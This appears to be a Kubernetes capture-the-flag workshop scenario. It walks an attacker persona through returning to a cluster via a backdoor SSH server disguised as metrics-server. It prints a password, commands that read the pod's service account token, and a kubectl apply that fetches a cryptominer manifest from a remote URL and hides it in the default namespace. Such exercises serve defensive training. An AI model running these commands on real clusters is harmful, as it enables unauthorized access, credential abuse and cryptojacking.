# Persistence: Scenario 2 Attack

## Backstory

### Name: __Red__

* Opportunist
* Easy money via crypto-mining
* Uses automated scans of web IP space looking for known exploits and vulnerabilities

### Motivations

* __Red__ notices that public access to the cluster is gone and the cryptominers have stopped reporting in
* __Red__ is excited to discover that the SSH server they left behind is still active

## Re-establishing a Foothold

__Red__ reconnects to the cluster using the SSH service disguised as a *metrics-server* on the cluster. While having access to an individual container may not seem like much of a risk at first glance, this container has two characteristics that make it very dangerous:  

* There is a service account associated with the container which has been granted access to all kubernetes APIs
* The container is running with a privileged security context which grants it direct access to the host OS

## Deploying Miners

Connect to the cluster via SSH:
```console
echo "SSH password is: Sup3r_S3cr3t_P@ssw0rd"
ssh root@<service IP from attack 1> -p 8080
```

To restart our crypto mining, we will need the token for the pod service account:
```console
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

This time, we will create our miner in the `default` namespace. Since it is common for lots of orphaned deployments to land here, maybe ours will go unnoticed:
```console
export NAMESPACE=default
```

And we will be connecting to the kubernetes API from inside the cluster this time:
```console
export API_SERVER="https://kubernetes.default.svc"
```

Let's redownload kubectl here and create our miner:
```console
cd /usr/local/bin; curl -LO https://dl.k8s.io/release/v1.30/bin/linux/amd64/kubectl; chmod 555 kubectl
export KUBERNETES_SERVICE_HOST=kubernetes.default.svc
export KUBERNETES_SERVICE_PORT=443
kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml
```

Verify that the pod is running:
```console
kubectl get pods -n default
curl -k -X GET "$API_SERVER/api/v1/namespaces/$NAMESPACE/pods?labelSelector=run%3dbitcoinero" -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" 2>/dev/null | grep phase
kubectl get pods -A
```

Time for some celebratory pizza!